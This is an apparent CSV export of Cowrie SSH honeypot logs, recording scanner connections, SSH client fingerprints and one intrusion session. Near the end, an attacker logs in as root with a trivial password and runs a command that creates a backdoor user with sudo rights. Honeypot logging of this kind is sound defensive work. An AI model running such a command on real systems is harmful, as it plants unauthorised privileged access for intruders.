"TimeGenerated [UTC]","Timestamp [UTC]",RawData,Message,Severity,TenantId,Type,"_ResourceId"
"9/20/2024, 6:11:15.494 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""ssh-ed25519-cert-v01@openssh.com"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:11:15.492686Z"",""src_ip"":""192.155.90.118"",""session"":""37d8a9aeed34""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:11:15.915 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.9154794216156006,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:11:15.914357Z"",""src_ip"":""192.155.90.118"",""session"":""37d8a9aeed34""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 7:27:00.048 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":4.187134504318237,""message"":""Connection lost after 4 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T07:27:00.047803Z"",""src_ip"":""198.235.24.158"",""session"":""79e745d1bcb3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:53:24.231 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""198.235.24.222"",""src_port"":63840,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""5d352370cf62"",""protocol"":""ssh"",""message"":""New connection: 198.235.24.222:63840 (10.0.0.4:2222) [session: 5d352370cf62]"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:53:24.229773Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:53:24.816 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-ZGrab ZGrab SSH Survey"",""message"":""Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:53:24.815933Z"",""src_ip"":""198.235.24.222"",""session"":""5d352370cf62""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:53:25.729 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""dd9bcf093c355da7000132131cb36fd0"",""hasshAlgorithms"":""diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,aes192-cbc,aes256-cbc,arcfour,rijndael-cbc@lysator.liu.se;hmac-md5-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-md5,hmac-sha1,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96;none,zlib@openssh.com,zlib"",""kexAlgs"":[""diffie-hellman-group-exchange-sha256"",""diffie-hellman-group-exchange-sha1"",""diffie-hellman-group14-sha1"",""diffie-hellman-group1-sha1""],""keyAlgs"":[""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521"",""ssh-ed25519-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""ssh-dss-cert-v01@openssh.com"",""ssh-rsa-cert-v00@openssh.com"",""ssh-dss-cert-v00@openssh.com"",""ssh-ed25519"",""ssh-rsa"",""ssh-dss""],""encCS"":[""aes128-ctr"",""aes192-ctr"",""aes256-ctr"",""arcfour256"",""arcfour128"",""aes128-gcm@openssh.com"",""aes256-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-cbc"",""3des-cbc"",""blowfish-cbc"",""cast128-cbc"",""aes192-cbc"",""aes256-cbc"",""arcfour"",""rijndael-cbc@lysator.liu.se""],""macCS"":[""hmac-md5-etm@openssh.com"",""hmac-sha1-etm@openssh.com"",""umac-64-etm@openssh.com"",""umac-128-etm@openssh.com"",""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-512-etm@openssh.com"",""hmac-ripemd160-etm@openssh.com"",""hmac-sha1-96-etm@openssh.com"",""hmac-md5-96-etm@openssh.com"",""hmac-md5"",""hmac-sha1"",""umac-64@openssh.com"",""umac-128@openssh.com"",""hmac-sha2-256"",""hmac-sha2-512"",""hmac-ripemd160"",""hmac-ripemd160@openssh.com"",""hmac-sha1-96"",""hmac-md5-96""],""compCS"":[""none"",""zlib@openssh.com"",""zlib""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:53:25.726380Z"",""src_ip"":""198.235.24.222"",""session"":""5d352370cf62""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:53:27.333 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":3.1007533073425293,""message"":""Connection lost after 3 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:53:27.332365Z"",""src_ip"":""198.235.24.222"",""session"":""5d352370cf62""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.311 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""172.104.11.4"",""src_port"":23880,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""9cb4a477537d"",""protocol"":""ssh"",""message"":""New connection: 172.104.11.4:23880 (10.0.0.4:2222) [session: 9cb4a477537d]"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.310437Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.324 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.323528Z"",""src_ip"":""172.104.11.4"",""session"":""9cb4a477537d""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.330 PM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""rsa-sha2-512-cert-v01@openssh.com"",""rsa-sha2-256-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.324515Z"",""src_ip"":""172.104.11.4"",""session"":""9cb4a477537d""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.349 PM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.03668951988220215,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.348463Z"",""src_ip"":""172.104.11.4"",""session"":""9cb4a477537d""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.358 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""172.104.11.4"",""src_port"":23890,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""e3b2c81ed31f"",""protocol"":""ssh"",""message"":""New connection: 172.104.11.4:23890 (10.0.0.4:2222) [session: e3b2c81ed31f]"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.357526Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.359 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.359139Z"",""src_ip"":""172.104.11.4"",""session"":""e3b2c81ed31f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.403 PM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.374388Z"",""src_ip"":""172.104.11.4"",""session"":""e3b2c81ed31f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.403 PM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.030223369598388672,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.389039Z"",""src_ip"":""172.104.11.4"",""session"":""e3b2c81ed31f""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.403 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""172.104.11.4"",""src_port"":23894,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""fa6c8e879b78"",""protocol"":""ssh"",""message"":""New connection: 172.104.11.4:23894 (10.0.0.4:2222) [session: fa6c8e879b78]"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.398466Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.422 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.421463Z"",""src_ip"":""172.104.11.4"",""session"":""fa6c8e879b78""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.426 PM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""ssh-ed25519-cert-v01@openssh.com"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.422655Z"",""src_ip"":""172.104.11.4"",""session"":""fa6c8e879b78""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 12:15:18.477 PM",,"{""eventid"":""cowrie.session.closed"",""duration"":0.07714271545410156,""message"":""Connection lost after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T12:15:18.476428Z"",""src_ip"":""172.104.11.4"",""session"":""fa6c8e879b78""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:48.043 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""183.81.169.238"",""src_port"":50306,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""1f2ab4c830c8"",""protocol"":""ssh"",""message"":""New connection: 183.81.169.238:50306 (10.0.0.4:2222) [session: 1f2ab4c830c8]"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:48.042399Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:48.445 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:48.443807Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:48.448 PM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""rsa-sha2-512-cert-v01@openssh.com"",""rsa-sha2-256-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""ssh-dss-cert-v01@openssh.com"",""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ssh-ed25519-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:48.445709Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:50.296 PM",,"{""eventid"":""cowrie.login.success"",""username"":""root"",""password"":""0"",""message"":""login attempt [root/0] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:50.295510Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:51.077 PM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:51.075444Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:51.078 PM",,"{""eventid"":""cowrie.command.input"",""input"":""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 mSmKGGfS) system && sudo usermod -aG sudo system"",""message"":""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 mSmKGGfS) system && sudo usermod -aG sudo system"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:51.077248Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:51.079 PM",,"{""eventid"":""cowrie.command.input"",""input"":""openssl passwd -1 mSmKGGfS"",""message"":""CMD: openssl passwd -1 mSmKGGfS"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:51.078791Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:51.080 PM",,"{""eventid"":""cowrie.command.failed"",""input"":""openssl passwd -1 mSmKGGfS"",""message"":""Command not found: openssl passwd -1 mSmKGGfS"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:51.080135Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:26:51.083 PM",,"{""eventid"":""cowrie.command.failed"",""input"":""apt update"",""message"":""Command not found: apt update"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:26:51.082468Z"",""src_ip"":""183.81.169.238"",""session"":""1f2ab4c830c8""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
